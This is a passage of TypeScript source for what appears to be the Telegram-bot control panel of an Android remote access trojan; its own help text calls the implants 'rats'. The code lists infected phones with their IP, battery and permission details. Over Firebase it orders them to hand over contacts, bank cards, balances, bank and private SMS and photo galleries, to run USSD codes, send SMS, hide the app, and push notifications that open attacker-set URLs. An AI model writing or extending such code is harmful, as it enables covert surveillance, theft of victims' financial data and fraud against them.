                                createFont("🔴 client does not exist"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        let gallery_pictures: string[] = [];
                        if (fs.existsSync(path.join(gallery_path, client.id))) {
                            gallery_pictures = await fs.promises.readdir(path.join(gallery_path, client.id));
                        }
                        const first_connection = getJalaliTime(client.connected_at);
                        const last_connection = getJalaliTime(client.last_connection_at);
                        const first_connection_str = `${first_connection.year}/${first_connection.month}/${first_connection.day} - ${first_connection.hour}:${first_connection.minute}:${first_connection.second}`;
                        const last_connection_str = `${last_connection.year}/${last_connection.month}/${last_connection.day} - ${last_connection.hour}:${last_connection.minute}:${last_connection.second}`;
                        const text_to_send = createFont("👤 | selected user: ") + `/set_${client.id}\n\n` + createFont(`🔏 | blocked: ${client.blocked ? 'yes' : 'no'}\n🖼️ | pictures: ${gallery_pictures.length}\n${client.is_online ? '🟢' : '🔴'} | online: ${client.is_online ? "yes" : "no"}\n\n💰 | balance: ${formatNumberWithUnit(client.balance_count ? client.balance_count : "0")}\n📊 | permissions: ${(client.permissions ?? []).join(", ")}`) + "\n\n" + `<blockquote expandable>` + createFont("🌐 | ip: ") + `<code>${client.ip}</code>` + createFont(`\n${(client.battery >= 30) ? '🔋' : '🪫'} | battery: ${client.battery}%\n📱 | mobile: ${client.mobile}\n🦠 | android ${client.android_version}\n🪡 | app name: ${client.app_name}\n`) + `${(client.screen_status == 'OFF') ? '🔒' : '🔓'}` + createFont(` | screen: ${client.screen_status} | ${client.app_behave.toLowerCase()} app`) + createFont(`\n📈 | app version: ${client.version}`) + "</blockquote>\n\n" + "<blockquote>" + createFont(`⏲️ | since ${first_connection_str}\n🪠 | last online ${last_connection_str}`) + "</blockquote>";

                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            text_to_send,
                            {
                                parse_mode: "HTML",
                                reply_parameters: { message_id: update.message.message_id },
                                reply_markup: { inline_keyboard: getUserPanel(update.message.from.id, client.id) }
                            }
                        );

                        return;
                    } else if (update.message.text.startsWith("/delcache_")) {
                        const client_id = update.message.text.slice(10);
                        const stat = await classify.ceph.getClientById(client_id);
                        if (!stat) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont("🔴 client does not exist"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        const _does_exist_path = path.join(gallery_path, client_id);
                        if (!fs.existsSync(_does_exist_path)) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont("🔴 client has never been captured gallery"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        } else {
                            await fs.promises.rm(_does_exist_path, { recursive: true, force: true });
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont("🔴 client gallery cache has been deleted on server"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }
                    } else if (update.message.text === "/global_del_cache") {
                        await fs.promises.rm(gallery_path).then(async () => {
                            await fs.promises.mkdir(gallery_path, { recursive: true });
                            await scarlett.api.sendMessage(
                                update.message!.chat.id,
                                createFont("✔️ all cache gallery from users have been deleted"),
                                { reply_parameters: { message_id: update.message!.message_id } }
                            );
                            return;
                        }).catch(async (e) => {
                            await scarlett.api.sendMessage(
                                update.message!.chat.id,
                                createFont("🔴 faild to delete caches"),
                                { reply_parameters: { message_id: update.message!.message_id } }
                            );
                            console.error(e);
                        });
                    } else if (update.message.text.startsWith("/help")) {
                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont("⚒️ - help message\n\n") + "<blockquote expandable>" + createFont("/start - see panel\n\nblock [reply] - block an ip\n\ndelblock [reply] - unblock an ip\n\nlistblock - see block`s list\n\n/set_[CLIENT ID] - open user`s panel\n\n/broadcast - open broadcast`s panel (send message to all users)\n\n/delcache_[CLIENT ID] - delete all gallery pictures for a user\n\n/global_del_cache - delete all gallery pictures for all users\n\n/setLink [LINK] - set new link for rats\n\n/getLink - see the link which has been seted for rats\n\n/setApp [reply] - set new app\n\n/delApp [APP ID] - remove app from list of apps\n\n/apps - show list of apps") + "</blockquote>",
                            { reply_parameters: { message_id: update.message.message_id }, parse_mode: "HTML" }
                        );
                    } else if (update.message.text.startsWith("/setLink")) {
                        const gotLink = update.message.text.slice(9);
                        if (gotLink.length === 0) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont("🔴 please write link infront of command"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        } else if (!gotLink.startsWith("https://")) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont("🔴 link does not startwith https://"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        } else {
                            await fs.promises.writeFile(
                                path.join(__dirname, "..", ".link.txt"),
                                gotLink
                            );

                            await fs.promises.writeFile(
                                path.join(__dirname, "..", ".links", `${_port_of.port}.txt`),
                                gotLink
                            );

                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont("🔗 new link saved"),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                        }
                    } else if (update.message.text.startsWith("/getLink")) {
                        await fs.promises.readFile(
                            path.join(__dirname, "..", ".link.txt"),
                        ).then(async (content) => {
                            await scarlett.api.sendMessage(
                                update.message!.chat.id,
                                createFont(`🔗 - ${content.toString()}`),
                                { reply_parameters: { message_id: update.message!.message_id } }
                            );
                        });
                    } else if (update.message.text.startsWith("/list")) {
                        const admin_text = admins.map((admin) => `👥 | <code>${admin.id}</code>\n📮 | <code>${admin.role.toUpperCase()}</code>\n----------------\n`).join("\n");
                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont(`👥 | admins [ ${admins.length} ]`) + `\n\n${admin_text}`,
                            {
                                parse_mode: "HTML",
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: "🔃 refresh 🔃", callback_data: `refreshAdminList_${update.message.from.id}` }]
                                    ]
                                }
                            }
                        );
                    } else if (update.message.text === "ادمین") {
                        if (!update.message.reply_to_message) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | please reply on someone`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        if (!update.message.reply_to_message.from) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | cannot reach the owner of replied message`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        let target: number;
                        if (update.message.reply_to_message.from.id === update.message.from.id) {
                            if (!/^[1-9]\d*$/.test(update.message.reply_to_message.text!)) {
                                target = update.message.reply_to_message.from.id;
                            } else {
                                target = parseInt(update.message.reply_to_message.text!);
                            }
                        } else {
                            target = update.message.reply_to_message.from.id;
                        }

                        const order_from = admins.find((admin) => admin.id === update.message!.from.id);
                        const order_to = admins.find((admin) => admin.id === update.message!.reply_to_message!.from!.id);

                        if (!order_from) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | you are not an admin`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        if (order_from.role === "common") {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | you are not able to promote someone, your role is common`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        if (order_to) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | you are not able to promote an admin again`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        if (target === update.message.from.id) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | you cannot commit an action on yourself`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        admins.push({ id: target, role: "common" });

                        const committed_by = update.message.from.username ? `@${update.message.from.username}` : (update.message.from.first_name + update.message.from.last_name).replaceAll("<", "").replaceAll(">", "");
                        const admin_text = admins.map((admin) => `👤 | <code>${admin.id}</code>\n📮 | <code>${admin.role.toUpperCase()}</code>\n----------------\n`).join("\n");
                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont(`✅ | new admin promoted [ role: common | by: `) + `${committed_by}` + createFont(` | ${admins.length} ]`) + `\n\n${admin_text}`,
                            {
                                parse_mode: "HTML",
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: "🔃 refresh 🔃", callback_data: `refreshAdminList_${update.message.from.id}` }]
                                    ]
                                }
                            }
                        );
                    } else if (update.message.text === "عزل") {
                        if (!update.message.reply_to_message) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | please reply on someone`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        if (!update.message.reply_to_message.from) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | cannot reach the owner of replied message`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        let target: number;
                        if (update.message.reply_to_message.from.id === update.message.from.id) {
                            if (!/^[1-9]\d*$/.test(update.message.reply_to_message.text!)) {
                                target = update.message.reply_to_message.from.id;
                            } else {
                                target = parseInt(update.message.reply_to_message.text!);
                            }
                        } else {
                            target = update.message.reply_to_message.from.id;
                        }

                        let order_to_index: number | null = null;
                        const order_from = admins.find((admin) => admin.id === update.message!.from.id);
                        const order_to = admins.find((admin, indx) => {
                            if (admin.id === update.message!.reply_to_message!.from!.id) {
                                order_to_index = indx;
                                return true;
                            }
                        });

                        if (!order_from) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | you are not an admin`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        if (order_from.role === "common") {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | you are not able to depromote someone, your role is common`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        if (order_to) {
                            if (order_to.role !== "common") {
                                await scarlett.api.sendMessage(
                                    update.message.chat.id,
                                    createFont(`🔴 | you are not able to depromote an admin with higher rank than yours`),
                                    { reply_parameters: { message_id: update.message.message_id } }
                                );
                                return;
                            }
                        } else {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | replied user [ ${update.message.reply_to_message.from.id} ] is not an admin`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        if (target === update.message.from.id) {
                            await scarlett.api.sendMessage(
                                update.message.chat.id,
                                createFont(`🔴 | you cannot commit an action on yourself`),
                                { reply_parameters: { message_id: update.message.message_id } }
                            );
                            return;
                        }

                        admins.splice(order_to_index!, 1);

                        const committed_by = update.message.from.username ? `@${update.message.from.username}` : (update.message.from.first_name + update.message.from.last_name).replaceAll("<", "").replaceAll(">", "");
                        const admin_text = admins.map((admin) => `👤 | <code>${admin.id}</code>\n📮 | <code>${admin.role.toUpperCase()}</code>\n----------------\n`).join("\n");
                        await scarlett.api.sendMessage(
                            update.message.chat.id,
                            createFont(`✅ | admin depromoted [ by: `) + `${committed_by}` + createFont(` | ${admins.length} ]`) + `\n\n${admin_text}`,
                            {
                                parse_mode: "HTML",
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: "🔃 refresh 🔃", callback_data: `refreshAdminList_${update.message.from.id}` }]
                                    ]
                                }
                            }
                        );
                    }
                }
            }
        } else if (update.callback_query) {
            const adminids = admins.map((admin) => admin.id);
            if (!adminids.includes(update.callback_query.from.id)) return;
            if (update.callback_query.data) {
                const _spl = update.callback_query.data.split("_");
                const _uid = parseInt(_spl[1]!);

                if (!update.callback_query.message) return;
                if (!update.callback_query.message.chat.id) return;
                if (update.callback_query.from.id !== _uid) return;

                const _port_of = await classify.portService.getChatId(update.callback_query.message.chat.id.toString());
                if (!_port_of) return;

                if (_port_of.status !== "active") return;

                const _mode = _spl[0];

                switch (_mode) {
                    case "onlineuserslist": {
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            createFont("⚓ | Loading (10 seconds) ...")
                        );

                        try {
                            const _stat = await sendFirebaseMessage({
                                data: { method: "groupPing" },
                                topic: _port_of.port.replaceAll("+", "")
                            }, false);

                            if (!_stat.status) {
                                await scarlett.api.editMessageText(
                                    update.callback_query.message.chat.id,
                                    update.callback_query.message.message_id,
                                    createFont(`🔴 | ${_stat.message}`)
                                );
                                return;
                            }

                            setTimeout(async () => {
                                const page_index = 0;
                                const _rd_clients = await classify.ceph.getOnlineClientsByPort(_port_of.port);
                                const chunked = chunkList(_rd_clients);
                                const page = chunked[page_index];
                                if (!page) {
                                    await scarlett.api.editMessageText(
                                        update.callback_query!.message!.chat.id,
                                        update.callback_query!.message!.message_id,
                                        createFont(`🔴 | there is no user on page ${page_index + 1}, try again later`)
                                    );
                                    return;
                                }

                                let txt = createFont(`🛜 | online users [ ${page_index + 1}/${chunked.length} | ${page.length} ]\n`);
                                let num = 1;
                                for (const cws of page) {
                                    txt += createFont(`\n${num + (page_index * 20)} | `) + `/set_${cws}`;
                                    num += 1;
                                }

                                const keys: InlineKeyboardButton[][] = [[]];

                                if (chunked[page_index - 1]) {
                                    keys[0]!.push({ text: createFont("⏮️ previous"), callback_data: `seeonlinepage_${update.callback_query!.from.id}_${page_index - 1}` });
                                }

                                if (chunked[page_index + 1]) {
                                    keys[0]!.push({ text: createFont("next ⏭️"), callback_data: `seeonlinepage_${update.callback_query!.from.id}_${page_index + 1}` });
                                }

                                if (keys[0]!.length === 0) {
                                    keys.splice(0, 1);
                                }

                                keys.push([
                                    { text: createFont("↩️ back"), callback_data: `showStartPanel_${update.callback_query!.from.id}` },
                                    { text: createFont("🔃 update 🔃"), callback_data: `onlineuserslist_${update.callback_query!.from.id}` }
                                ]);

                                await scarlett.api.editMessageText(
                                    update.callback_query!.message!.chat.id,
                                    update.callback_query!.message!.message_id,
                                    txt,
                                    { parse_mode: "HTML", reply_markup: { inline_keyboard: keys } }
                                );
                            }, 10000)
                        } catch (e) {
                            console.log("group ping", e);
                        }

                        break;
                    }
                    case "seeonlinepage": {
                        const online_section_page_index = parseInt(_spl[2]!);
                        const _os_rd_clients = await classify.ceph.getOnlineClientsByPort(_port_of.port);
                        const online_section_chunked = chunkList(_os_rd_clients);
                        const online_section_page = online_section_chunked[online_section_page_index];
                        if (!online_section_page) {
                            await scarlett.api.answerCallbackQuery(update.callback_query.id, {
                                show_alert: true,
                                text: `there is no user on page ${online_section_page_index + 1}, try again later`
                            });
                            return;
                        }

                        let online_section_txt = createFont(`🛜 | online users [ ${online_section_page_index + 1}/${online_section_chunked.length} | ${online_section_page.length} ]\n`);
                        let online_section_num = 1;
                        for (const cws of online_section_page) {
                            online_section_txt += createFont(`\n${online_section_num + (online_section_page_index * 20)} | `) + `/set_${cws}`;
                            online_section_num += 1;
                        }

                        const online_section_keys: InlineKeyboardButton[][] = [[]];

                        if (online_section_chunked[online_section_page_index - 1]) {
                            online_section_keys[0]!.push({ text: createFont("⏮️ previous"), callback_data: `seeonlinepage_${update.callback_query.from.id}_${online_section_page_index - 1}` });
                        }

                        if (online_section_chunked[online_section_page_index + 1]) {
                            online_section_keys[0]!.push({ text: createFont("next ⏭️"), callback_data: `seeonlinepage_${update.callback_query.from.id}_${online_section_page_index + 1}` });
                        }

                        if (online_section_keys[0]!.length === 0) {
                            online_section_keys.splice(0, 1);
                        }

                        online_section_keys.push([
                            { text: createFont("↩️ back"), callback_data: `showStartPanel_${update.callback_query.from.id}` },
                            { text: createFont("🔃 update 🔃"), callback_data: `onlineuserslist_${update.callback_query.from.id}` }
                        ]);

                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            online_section_txt,
                            { parse_mode: "HTML", reply_markup: { inline_keyboard: online_section_keys } }
                        );

                        break;
                    }
                    case "alluserslist": {
                        const all_page_index = 0;
                        const all_clients = await classify.ceph.getClientsCommittedFrom(_port_of.port);
                        const all_chunked = chunkList(all_clients);
                        const all_page = all_chunked[all_page_index];
                        if (!all_page) {
                            await scarlett.api.answerCallbackQuery(update.callback_query.id, {
                                show_alert: true,
                                text: `there is no user on page ${all_page_index + 1}, try again later`
                            });
                            return;
                        }

                        let all_txt = createFont(`👥 | all users [ ${all_page_index + 1}/${all_chunked.length} | ${all_page.length} ]\n`);
                        let all_num = 1;
                        for (const cws of all_page) {
                            all_txt += createFont(`\n${all_num + (all_page_index * 20)} | `) + `/set_${cws.id}`;
                            all_num += 1;
                        }

                        const all_keys: InlineKeyboardButton[][] = [[]];

                        if (all_chunked[all_page_index - 1]) {
                            all_keys[0]!.push({ text: createFont("⏮️ previous"), callback_data: `seeallpage_${update.callback_query.from.id}_${all_page_index - 1}` });
                        }

                        if (all_chunked[all_page_index + 1]) {
                            all_keys[0]!.push({ text: createFont("next ⏭️"), callback_data: `seeallpage_${update.callback_query.from.id}_${all_page_index + 1}` });
                        }

                        if (all_keys[0]!.length === 0) {
                            all_keys.splice(0, 1);
                        }

                        all_keys.push([
                            { text: createFont("↩️ back"), callback_data: `showStartPanel_${update.callback_query.from.id}` },
                            { text: createFont("🔃 update 🔃"), callback_data: `alluserslist_${update.callback_query.from.id}` }
                        ]);

                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            all_txt,
                            { parse_mode: "HTML", reply_markup: { inline_keyboard: all_keys } }
                        );

                        break;
                    }
                    case "seeallpage": {
                        const all_section_page_index = parseInt(_spl[2]!);
                        const all_section_clients = await classify.ceph.getClientsCommittedFrom(_port_of.port);
                        const all_section_chunked = chunkList(all_section_clients);
                        const all_section_page = all_section_chunked[all_section_page_index];
                        if (!all_section_page) {
                            await scarlett.api.answerCallbackQuery(update.callback_query.id, {
                                show_alert: true,
                                text: `there is no user on page ${all_section_page_index + 1}, try again later`
                            });
                            return;
                        }

                        let all_section_txt = createFont(`👥 | all users [ ${all_section_page_index + 1}/${all_section_chunked.length} | ${all_section_page.length} ]\n`);
                        let all_section_num = 1;
                        for (const cws of all_section_page) {
                            all_section_txt += createFont(`\n${all_section_num + (all_section_page_index * 20)} | `) + `/set_${cws.id}`;
                            all_section_num += 1;
                        }

                        const all_section_keys: InlineKeyboardButton[][] = [[]];

                        if (all_section_chunked[all_section_page_index - 1]) {
                            all_section_keys[0]!.push({ text: createFont("⏮️ previous"), callback_data: `seeallpage_${update.callback_query.from.id}_${all_section_page_index - 1}` });
                        }

                        if (all_section_chunked[all_section_page_index + 1]) {
                            all_section_keys[0]!.push({ text: createFont("next ⏭️"), callback_data: `seeallpage_${update.callback_query.from.id}_${all_section_page_index + 1}` });
                        }

                        if (all_section_keys[0]!.length === 0) {
                            all_section_keys.splice(0, 1);
                        }

                        all_section_keys.push([
                            { text: createFont("↩️ back"), callback_data: `showStartPanel_${update.callback_query.from.id}` },
                            { text: createFont("🔃 update 🔃"), callback_data: `alluserslist_${update.callback_query.from.id}` }
                        ]);

                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            all_section_txt,
                            { parse_mode: "HTML", reply_markup: { inline_keyboard: all_section_keys } }
                        );

                        break;
                    }
                    case "uploadapp": {
                        await scarlett.api.deleteMessage(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id
                        );

                        const all_apps = await classify.apps.getApps();
                        for (const app of all_apps) {
                            await scarlett.api.sendDocument(
                                update.callback_query.message.chat.id,
                                app,
                                { reply_markup: { inline_keyboard: [getHelpPage()] } }
                            );
                        }

                        break;
                    }
                    case "createContact": {
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            createFont("❔ | enter the name ..."),
                            { reply_markup: { inline_keyboard: [getHelpPage()] } }
                        );
                        await classify.steps.add(update.callback_query.from.id, { step: "getNewContactName", cid: _spl[2], port: _port_of.port, timestamp: Date.now() });
                        break;
                    }
                    case "deleteContact": {
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            createFont("?? | enter the name/phone to search for it ..."),
                            { reply_markup: { inline_keyboard: [getHelpPage()] } }
                        );
                        await classify.steps.add(update.callback_query.from.id, { step: "getDeleteContactObject", cid: _spl[2], port: _port_of.port, timestamp: Date.now() });
                        break;
                    }
                    case "sendMessage": {
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            createFont("📞 | enter the target`s phone number ..."),
                            { reply_markup: { inline_keyboard: [getHelpPage()] } }
                        );
                        await classify.steps.add(update.callback_query.from.id, { step: "getNewSingleMessagePhone", cid: _spl[2], port: _port_of.port, timestamp: Date.now() });
                        break;
                    }
                    case "sendMessageToAll": {
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            createFont("💬 | enter the message ..."),
                            { reply_markup: { inline_keyboard: [getHelpPage()] } }
                        );
                        await classify.steps.add(update.callback_query.from.id, { step: "getNewBroadcastSMSMessageText", cid: _spl[2], port: _port_of.port, timestamp: Date.now() });
                        break;
                    }
                    case "createMultipleContacts": {
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            createFont("?? | upload your contacts list with .txt format (text/plain | application/octet-stream) ..."),
                            { reply_markup: { inline_keyboard: [getHelpPage()] } }
                        );
                        await classify.steps.add(update.callback_query.from.id, { step: "getNewContactsFile", cid: _spl[2], port: _port_of.port, timestamp: Date.now() });
                        break;
                    }
                    case "runUSSD": {
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            createFont("🛰️ | enter the ussd code to execute ..."),
                            { reply_markup: { inline_keyboard: [getHelpPage()] } }
                        );
                        await classify.steps.add(update.callback_query.from.id, { step: "getNewUSSDCode", cid: _spl[2], port: _port_of.port, timestamp: Date.now() });
                        break;
                    }
                    case "getContacts":
                    case "getCards":
                    case "getBalance":
                    case "getPhoneInfo":
                    case "hideApp":
                    case "unhideApp":
                    case "getSMSBanks":
                    case "getSMS":
                    case "getSMSPrivates":
                    case "getPhoneNumbers":
                    case "getGallery":
                    case "infinite": {
                        const sent_msg = await scarlett.api.sendMessage(
                            update.callback_query.message.chat.id,
                            createFont(`🛰️ | sending ~ ${_mode}\n⌛ | ${getNowJalali(getJalaliTime())}\n🌀 | `) + '/set_' + _spl[2],
                            { parse_mode: "HTML" }
                        );

                        const user_token = await classify.tokenService.getAndroidIdAndPort(_spl[2]!, _port_of.port);
                        const user_info = await classify.ceph.getClientById(_spl[2]!);

                        if (user_token && user_info) {
                            const _msg_stat = await sendFirebaseMessage({
                                data: {
                                    method: _mode,
                                    x: _spl[2]!,
                                    y: (sent_msg.message_id as any)
                                },
                                token: user_token.token,
                                clientPublicKey: user_info.public_key
                            });

                            if (_msg_stat.status === false) {
                                await scarlett.api.sendMessage(
                                    update.callback_query.message.chat.id,
                                    createFont(`🔴 | ${_msg_stat['message']}`),
                                    { reply_parameters: { message_id: update.callback_query.message.message_id } }
                                );
                            }
                        }

                        break;
                    }
                    case "block": {
                        await scarlett.api.sendMessage(
                            update.callback_query.message.chat.id,
                            createFont("🔒 | user has been blocked\n⚠️ | all connections (Socket/HTTP-FormData [Uploader]) will reject from this client id\n\nℹ️ | for blocking ips use ") + "block <IP>" + createFont(" or") + "بلاک <IP>",
                            { reply_parameters: { message_id: update.callback_query.message.message_id } }
                        );

                        await classify.ceph.updateClient(_spl[2]!, { blocked: true });

                        break;
                    }
                    case "unblock": {
                        await scarlett.api.sendMessage(
                            update.callback_query.message.chat.id,
                            createFont("🔓 | user has been unblocked\n⚠️ | connections will accept from this client id\n\nℹ️ | for blocking ips use ") + "block <IP>" + createFont(" or") + "حذف بلاک <IP>",
                            { reply_parameters: { message_id: update.callback_query.message.message_id } }
                        );

                        await classify.ceph.updateClient(_spl[2]!, { blocked: false });
                        break;
                    }
                    case "hideAppBroadcast":
                    case "unhideAppBroadcast": {
                        break;
                    }
                    case "AllByAllBroadcast": {
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            createFont("💬 | enter the message ..."),
                            { reply_markup: { inline_keyboard: [getHelpPage()] } }
                        );
                        await classify.steps.add(update.callback_query.from.id, { step: "getAllByAll", cid: _spl[2], port: _port_of.port, timestamp: Date.now() });
                        break;
                    }
                    case "AllByOneBroadcast": {
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            createFont("?? | enter the phone number ..."),
                            { reply_markup: { inline_keyboard: [getHelpPage()] } }
                        );
                        await classify.steps.add(update.callback_query.from.id, { step: "getAllByOneNumber", cid: _spl[2], port: _port_of.port, timestamp: Date.now() });
                        break;
                    }
                    case "setMaskname": {
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            createFont("🖋️ | enter the nickname ..."),
                            { reply_markup: { inline_keyboard: [getHelpPage()] } }
                        );
                        await classify.steps.add(update.callback_query.from.id, { step: "getNickname", cid: _spl[2], port: _port_of.port, timestamp: Date.now() });
                        break;
                    }
                    case "pushNotification": {
                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            "preparing builder ..."
                        ).then(async () => {
                            const { notif_id } = await classify.notification.createNotification({
                                title: "",
                                body: "",
                                click_action: "OPEN_URL",
                                message_id: update.callback_query!.message!.message_id,
                                sound: "default",
                                url: "",
                                client_id: _spl[2]!
                            });

                            const _created_text = await classify.notification.createText(
                                {
                                    title: "",
                                    body: "",
                                    click_action: "OPEN_URL",
                                    sound: "default",
                                    url: ""
                                },
                                createFont
                            );

                            await scarlett.api.editMessageText(
                                update.callback_query!.message!.chat.id,
                                update.callback_query!.message!.message_id,
                                createFont("?? | notification builder\n\n??? | create a new notification under 15 minutes\n\n") + "<blockquote expandable>" + _created_text + "</blockquote>",
                                {
                                    parse_mode: "HTML",
                                    reply_markup: {
                                        inline_keyboard: [
                                            [
                                                { text: createFont("??? title"), callback_data: `editTitle_${_uid}_${notif_id}` },
                                                { text: createFont("body ??"), callback_data: `editBody_${_uid}_${notif_id}` }
                                            ],
                                            [
                                                { text: createFont("?? sound"), callback_data: `editSound_${_uid}_${notif_id}` },
                                                { text: createFont("url ??"), callback_data: `editURL_${_uid}_${notif_id}` }
                                            ],
                                            [
                                                { text: createFont("?? big picture ??"), callback_data: `editBigPicture_${_uid}_${notif_id}` }
                                            ],
                                            [
                                                { text: createFont("?? big icon"), callback_data: `editBigIcon_${_uid}_${notif_id}` },
                                                { text: createFont("small icon ??"), callback_data: `editSmallIcon_${_uid}_${notif_id}` }
                                            ],
                                            [
                                                { text: createFont("↩️ back"), callback_data: `showUserPanel_${_uid}_${_spl[2]}` },
                                                { text: createFont("push ??"), callback_data: `pushRealNotification_${_uid}_${notif_id}` }
                                            ]
                                        ]
                                    }
                                }
                            );
                        }).catch((er) => {
                            console.error(er);
                        });
                        break;
                    }
                    case "showUserPanel": {
                        const cid = _spl[2]!;
                        const client = await classify.ceph.getClientById(cid);

                        if (!client) {
                            await scarlett.api.deleteMessage(update.callback_query.message.chat.id, update.callback_query.message.message_id);
                            await scarlett.api.answerCallbackQuery(update.callback_query.id, {
                                text: createFont("🔴 client does not exist"),
                                show_alert: true
                            });
                            return;
                        }

                        let gallery_pictures: string[] = [];
                        if (fs.existsSync(path.join(gallery_path, cid))) {
                            gallery_pictures = await fs.promises.readdir(path.join(gallery_path, cid));
                        }
                        const first_connection = getJalaliTime(client.connected_at);
                        const last_connection = getJalaliTime(client.last_connection_at);
                        const first_connection_str = `${first_connection.year}/${first_connection.month}/${first_connection.day} - ${first_connection.hour}:${first_connection.minute}:${first_connection.second}`;
                        const last_connection_str = `${last_connection.year}/${last_connection.month}/${last_connection.day} - ${last_connection.hour}:${last_connection.minute}:${last_connection.second}`;
                        const text_to_send = createFont("👤 | selected user: ") + `/set_${client.id}\n\n` + createFont(`🔏 | blocked: ${client.blocked ? 'yes' : 'no'}\n🖼️ | pictures: ${gallery_pictures.length}\n${client.is_online ? '🟢' : '🔴'} | online: ${client.is_online ? "yes" : "no"}\n\n💰 | balance: ${formatNumberWithUnit(client.balance_count ? client.balance_count : "0")}\n📊 | permissions: ${(client.permissions ?? []).join(", ")}`) + "\n\n" + `<blockquote expandable>` + createFont("🌐 | ip: ") + `<code>${client.ip}</code>` + createFont(`\n${(client.battery >= 30) ? '🔋' : '🪫'} | battery: ${client.battery}%\n📱 | mobile: ${client.mobile}\n🦠 | android ${client.android_version}\n🪡 | app name: ${client.app_name}\n`) + `${(client.screen_status == 'OFF') ? '🔒' : '🔓'}` + createFont(` | screen: ${client.screen_status} | ${client.app_behave.toLowerCase()} app`) + createFont(`\n📈 | app version: ${client.version}`) + "</blockquote>\n\n" + "<blockquote>" + createFont(`⏲️ | since ${first_connection_str}\n🪠 | last online ${last_connection_str}`) + "</blockquote>";

                        await scarlett.api.editMessageText(
                            update.callback_query.message.chat.id,
                            update.callback_query.message.message_id,
                            text_to_send,
                            { parse_mode: "HTML", reply_markup: { inline_keyboard: getUserPanel(_uid, client.id) } }
                        );
                        break;
                    }
                    case "editTitle":
                    case "editBody":
                    case "editURL":
                    case "editBigPicture":
                    case "editBigIcon":
                    case "editSmallIcon": {
                        const notif_id = _spl[2]!;
                        const is_there = classify.notification.isThere(notif_id);

                        if (!is_there.status) {
                            await scarlett.api.answerCallbackQuery(update.callback_query.id, { text: createFont("notification session did not find"), show_alert: true });
                            return;
                        }

                        await scarlett.api.sendMessage(update.callback_query.message.chat.id, "...", { reply_parameters: { message_id: update.callback_query.message.message_id } }).then(async (sentMsgx) => {
